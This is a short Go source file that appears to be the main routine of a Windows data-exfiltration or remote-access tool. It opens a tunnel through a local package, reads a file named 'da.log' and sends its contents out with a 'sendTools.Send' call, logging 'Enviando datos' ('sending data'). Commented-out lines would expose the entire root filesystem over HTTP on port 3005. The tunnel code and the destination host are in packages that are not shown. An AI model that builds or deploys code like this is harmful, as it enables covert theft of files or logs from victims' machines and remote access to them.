package main

import (
	"fmt"
	"os"
	//"net/http"
	"windows/sendTools"
	"windows/tunnel"
	"time"
)


func main(){
	fmt.Println("ASJDLAJSLDJALKSDJLAKJSDLKASJDLKJALSDAKDLA")

	
	//re := tunnel.InitTunne()
	go tunnel.InitTunne()

	fmt.Println("Espera..")

	sendTools.Send("Enviando datos....")
	time.Sleep(10*time.Second)
	dat, err := os.ReadFile("da.log")
	if(err != nil){
		fmt.Println(err)
	}
	re := sendTools.Send(string(dat))
	fmt.Println(re)
		
	 
	

	//fmt.Println(tunnel.Command("linux", "hel"))
	// resp := http.FileServer(http.Dir("/"))

	// http.Handle("/", resp)

	// fmt.Println("iNICIANDO SERVER")
	// err := http.ListenAndServe(":3005", nil)
	// if(err != nil){
	// 	fmt.Println(err)
	// }
	select{}

}

